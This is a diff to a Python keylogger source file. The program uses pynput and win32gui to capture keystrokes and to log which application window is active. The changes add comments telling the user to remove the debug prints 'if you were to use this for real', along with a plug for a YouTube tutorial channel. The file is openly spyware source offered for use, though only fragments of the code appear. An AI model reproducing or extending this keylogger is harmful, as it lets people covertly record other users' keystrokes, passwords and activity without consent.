@@ -1,5 +1,11 @@
 #//python keylogging program
 
+## You will need to comment out the prints and exception prints on code if you were to use this for real, as its testing
+## i have prints on here that will tell you and let you know what part of the program is going at the time and that it is 
+## working 
+
+# Surport me and subscribe to my YouTube tutorial channel - https://bit.ly/2U58Lt9 / link also in my description. Thanks.
+
 #imports
 from pynput.keyboard import Key,Listener
 import win32gui
@@ -39,7 +45,8 @@ def on_press(key):
 		new_app = 'Windows Start Menu'
 	else:
 		pass
-
+	
+	
 	if new_app != old_app and new_app != '':
 		logged_data.append(f'[{datetime}] ~ {new_app}\n')
 		old_app = new_app
